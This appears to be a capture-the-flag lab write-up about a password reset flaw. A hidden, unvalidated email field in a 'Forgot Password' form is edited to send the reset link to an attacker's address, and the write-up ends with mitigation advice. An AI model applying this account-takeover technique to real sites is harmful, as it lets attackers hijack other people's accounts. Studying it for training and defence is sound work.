# **Exploiting and Securing a Password Reset Vulnerability**

## I Vulnerability Overview:

The vulnerability is a combination of Insecure Direct Object Reference (IDOR) and Client-Side Security Control. The "Forgot Password" form contains a hidden input field pre-filled with the email address of the account requesting the password reset. Since this field is client-side and not validated on the server, an attacker can modify it to redirect the password reset link to their own email address.

### - Steps to Exploit the Vulnerability:

#### 1 - Identify the Vulnerability:

Navigate to the "Forgot Password" page.
Inspect the page source or use browser developer tools (F12) to examine the form.
Notice the hidden input field:

```html
<input
  type="hidden"
  name="mail"
  value="webmaster@borntosec.com"
  maxlength="15"
/>
```

The value attribute contains the email address (webmaster@borntosec.com) to which the password reset link will be sent.

#### 2 - Modify the Hidden Field:

Change the value attribute of the mail input field to the attacker's email address (e.g., attacker@example.com).

```html
<input type="hidden" name="mail" value="attacker@example.com" maxlength="15" />
```

#### Submit the form

Submit the form by clicking the "Submit" button.

If the server does not validate the email address on the server side, you will see the flag of the bug

## II Recommendations for Mitigation:

- Server-Side Validation
- Use Secure Tokens
- Avoid Hidden Input Fields for Sensitive Data
- Implement Rate Limiting : _Limit the number of password reset requests that can be made within a certain time period (e.g., 5 requests per hour per IP address)._
- Set up alerts for suspicious activity to respond quickly to potential attacks.

[you can find more details about the insecure direct object reference in this link](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
